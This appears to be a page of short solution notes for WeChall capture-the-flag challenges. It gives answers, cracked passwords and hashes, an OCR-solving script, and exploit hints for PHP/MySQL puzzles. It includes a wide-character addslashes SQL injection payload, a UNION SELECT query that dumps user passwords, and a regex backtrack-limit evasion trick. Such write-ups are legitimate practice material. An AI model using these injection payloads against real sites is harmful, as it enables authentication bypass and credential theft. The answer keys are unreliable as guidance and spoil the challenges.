### Can you read me (Coding, Image)
use tesseract

ref: http://rk700.github.io/2014/06/23/can-you-read-me/

```bash
#!/bin/bash

wget -O ocr.png --no-cookies --header "Cookie:WC=7390992-11403-6nnwUyENAALTe4VK" 
http://www.wechall.net/challenge/can_you_readme/gimme.php

tesseract ocr.png ocr -psm 7

SOLUTION=`head -1 ocr.txt`

curl -b "WC=7390992-11403-6nnwUyENAALTe4VK" -G -d "solution=$SOLUTION" -d "cmd=Answer" \
http://www.wechall.net/challenge/can_you_readme/index.php
```


### Lettergrid (Coding)
```
zhqgbfcymzrkfnngvxhhv
hhbmprpprgcxkwwfjpbbx
jybfdpyvrxxzjbmjcqjyn
tnfgwdjzbyhttqwrlfwph
hxvrlqmrdfyygpgrqrzwp
vncvdkqmgdpnxtpnjmpfr
gzrhnbbvyhgtdpwmcgckl
dghhpfrqyvllrzwfpcmxp
blqhfrkpdqfmznmbmfycm
ddflvnhwpfhklmpzcbwfv
xfnhnncjfcxbzvnrxdkgf
lynfxotpyrcmrkndzmqrc
ccmokzvvvqodhvfxhfdfp
lvnniwwtknrhcjrdpqgzt
krmpntqbidzmwpnktbbxb
xkzfvtctfrqbmdncztbct
zfkfqzonkdjlycwbvpfkd
hhlgkrymubqbqkhfhjdjb
hcyrlllhqfxgktgbtjnth
cyhfbhdxztrqvbznvgjdt

become: networkmainboardmonitorcrypto
```

### The Nap (Crypto)


### Sudoku I (Logic)


### DropDaBass (Stegano, Audio)
http://www.wechall.net/challenge/anto/DropDaBass/record_description.php

Come on I will give you the password?


### Sidology (Research, Audio)
sid1.sid => The Last Ninja

sid2.sid => 1987 Time Warp, MUSICMASTER CREATED BY CHRIS HUELSBECK

sid3.sid => 

resource: http://artscene.textfiles.com/music/c64/HVSC/GAMES/S-Z/

```
The Last Ninja,The Great Giana Sisters,Who Dares Wins
```


### Out of the Cloud (Unknown)


### A Black Hats Tale (Cracking, Crypto, Storyline)
aircrack-ng

ref: https://github.com/CyrilP/wechall

```
jennifer
```


### Fix Us (Exploit, PHP)
Not XSS or CSRF


### Addslashes (Exploit, PHP, MySQL)
wide char!

```
username=%bf%27%20union+select+CHAR(65,100,109,105,110)%23&password=123&login=
```


### The Last Hope (Linux, Cracking)
Not "username_password"

ref: http://rk700.github.io/2014/06/23/the-last-hope/


### MD5.SALT (Cracking, MySQL)
' union select password,username from users where 1=1#

md5: 215c61d0104f8925b5f7e4e87a7cbdfa => academicsalt21

http://www.md5decrypt.org/

```
admin/academic
```


### WC Hashing Game (Cracking)
ref: https://github.com/CyrilP/wechall/blob/master/WCHash.java
```
coincidence,subversion,triangulation,orthography
```


### The Travelling Customer (Coding, Training)
https://xkcd.com/287/

def: https://github.com/xr1s/brush-title/tree/master/WeChall/The%20Travelling%20Customer


### Preg Evasion (Exploit, PHP)

pcre.backtrack_limit => default value is 100000

but 100000 is not enough

Try this => 'badmethodevilfunction' + '0' * 1000000


### Blinded by the light (MySQL, Exploit)
http://byd.dropsec.xyz/2016/07/23/Webchall-CTF-writeup2/
```
4F7CB4D8213C282B89D9D7A16FE25BB1
```


### Smile (Exploit, PHP)
Hint?: http://www.wechall.net/challenge/livinskull/smile/smiles/

Reset: http://www.wechall.net/challenge/livinskull/smile/reset.php


### Time to Reset (Exploit, Coding, PHP)
ref: https://medium.com/bugbountywriteup/wechall-wargame-solutions-76f60ea39b16


### Brainfucked (Special)
http://www.jsfuck.com/

window.alert = function(a){debugger;return window.alert(a);}

```js
(function anonymous(
) {
var s = 'UnfudgedDebugStuff'; s = s.length; alert(s); document.location.href='https://www.google.co.uk';
})
```

```
UnfudgedDebugStuff
```


### Zen (Special, Crypto)
www.youtube.com/watch?v=gjUYE21-uI0 => Manowar - Let the Gods Decide

